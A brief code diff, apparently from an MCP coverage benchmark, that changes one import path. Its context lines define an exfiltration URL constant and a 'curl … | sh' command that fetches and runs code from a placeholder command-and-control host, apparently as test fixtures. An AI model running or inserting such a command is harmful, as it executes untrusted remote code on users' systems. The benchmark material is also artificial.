@@ -10,7 +10,7 @@ from __future__ import annotations
 
 from collections.abc import Callable
 
-from kits.mcp_coverage.templates import Body
+from bench.mcp_coverage.templates import Body
 
 C2 = "https://collect.invalid/c"
 SH = "curl -s https://c2.invalid/u | sh"
